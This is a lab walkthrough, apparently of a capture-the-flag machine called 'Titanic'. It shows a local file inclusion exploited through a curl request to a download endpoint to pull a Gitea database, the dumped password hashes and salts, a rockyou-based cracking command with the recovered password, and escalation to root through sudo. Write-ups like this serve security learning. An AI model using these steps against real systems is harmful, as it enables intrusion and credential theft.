![image](https://github.com/user-attachments/assets/f7f60e38-3dfc-48ff-8ee9-ae8125773719)  
  
Machine Name: Titanic  
IP Address: 10.10.11.55  
Difficulty Rating:  Easy  
Date: 28-03-2025  

Nmap:  
![image](https://github.com/user-attachments/assets/eea8cced-e54d-4a8d-a30a-7d51a8c980b3)  

Nikto:  
![image](https://github.com/user-attachments/assets/72ec5688-749e-435d-a938-1c02c5cc17f7)  

Gobuster:  
![image](https://github.com/user-attachments/assets/996df7e3-f620-436e-bc97-cb56d41d4238)  
But found nothing  
Application is redirect to differnt pages are directory busting was getting tougher  

going throught the application found a LFI and found a user  
![image](https://github.com/user-attachments/assets/6546d71c-9fdc-41a7-8c3e-d950cc5edbb2)  

searching for /etc/hosts  
found dev subdomain  
![image](https://github.com/user-attachments/assets/702a812e-d6fe-436d-b10e-521783941c2a)  
accessing dev.titanic.htb  
found docker-config and flask-app  
![image](https://github.com/user-attachments/assets/67d5d705-af80-4a08-962e-48be04c598e4)  

found giteaand mysql docker-compose.yml files  
![image](https://github.com/user-attachments/assets/0b0480e7-c789-4227-bac9-43580c694561)  
![image](https://github.com/user-attachments/assets/fd32fbd3-665b-4510-b2aa-fa22e4811b10)  

using the LFI, search for gitea config files  
![image](https://github.com/user-attachments/assets/8dcb8223-e063-4886-870f-ac4cc507801b)  

lets dump the gitea.db file to local  
![image](https://github.com/user-attachments/assets/5ee9d0e4-de6a-4168-88ff-7ce6c889d8e8)  

curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db  
![image](https://github.com/user-attachments/assets/81f18374-9763-4f7c-a927-1a8b15fd81a9)  
![image](https://github.com/user-attachments/assets/4336aec8-3602-4585-a1e8-0f7e9552119f)  

got this users details  
1|administrator|root@titanic.htb|2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136  
2|developer|developer@titanic.htb|8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56  
  
  
it has salt and hash, as this are based on Gitea's configuration expecting it would be using  PBKDF2-HMAC-SHA256 hashing  
by googleing found a password cracker for Gitea  
https://github.com/dvdknaap/gitea-crack-passwords  
python3 gitTeaPassCrack.py -s 8bf3e3452b78544f8bee9400d6936d34 -t e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 -w /usr/share/wordlists/rockyou.txt  
  
found password for developer.  
Found password: 25282528  
  
ssh using the key,  
![image](https://github.com/user-attachments/assets/7aae1940-839b-49da-a066-e919812cee12)  

got the user.txt  
![image](https://github.com/user-attachments/assets/32a0a1a9-640b-430e-adbe-cdfa05166817)  
  
as developer has sudo access, i have switched to root user  
got the root.txt  
  
![image](https://github.com/user-attachments/assets/1afa9b26-366a-40dc-a586-5f1871eaae79)  






















